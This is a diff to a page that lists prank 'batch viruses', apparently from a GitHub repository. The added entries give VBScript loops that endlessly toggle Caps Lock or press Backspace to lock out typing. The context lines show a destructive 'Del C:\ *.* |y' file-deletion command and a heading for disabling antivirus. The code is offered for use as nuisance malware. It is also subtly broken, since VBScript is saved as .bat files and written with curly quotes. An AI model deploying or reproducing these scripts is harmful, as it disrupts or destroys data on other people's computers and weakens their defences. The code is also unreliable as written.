@@ -154,11 +154,41 @@ Del C:<span class="hljs-string">\</span> *.* |y
  
 
 
+### 8. Crazy Caps Lock
 
-virus8.bat
-crazy caps lock
-virus9.bat
-Endless Backspace
+
+<details><summary> Read More </summary>
+ 
+ <p><a href="https://github.com/SparkScratch-P/batch-virus/blob/main/viruses/virus8.bat">virus8.bat</a></p>
+<pre><code><span class="hljs-keyword">Set</span> wshShell <span class="hljs-comment">=wscript.CreateObject(</span>”<span class="hljs-comment">WScript.Shell</span>”<span class="hljs-comment">)</span>
+do
+wscript.sleep <span class="hljs-comment">100</span>
+wshshell.sendkeys “<span class="hljs-comment">{CAPSLOCK}</span>”
+loop
+</code></pre><p>This repeatedly toggles your Caps Lock key. It is fully harmless and gets proper on reboot, or once the task is ended in Task Manager.</p>
+
+   
+  </details>
+
+
+### 9. Endless Backspace
+
+
+
+<details><summary> Read More </summary>
+ 
+<p><a href="https://github.com/SparkScratch-P/batch-virus/blob/main/viruses/virus9.bat">virus9.bat</a></p>
+<pre><code>MsgBox “Let’s go back <span class="hljs-selector-tag">a</span> few steps”
+Set wshShell =wscript.CreateObject(”WScript.Shell”)
+do
+wscript<span class="hljs-selector-class">.sleep</span> <span class="hljs-number">100</span>
+wshshell<span class="hljs-selector-class">.sendkeys</span> “{bs}”
+loop
+</code></pre><p>This will repeatedly keep pressing your Backspace, and will not let u type. It pops up a message; “Let’s go back a few steps”, and starts nuisence. Anyways, it is temporary, and harmless.</p>
+    
+  </details>
+
+
 
 virus10.bat
 Disable the Antivirus
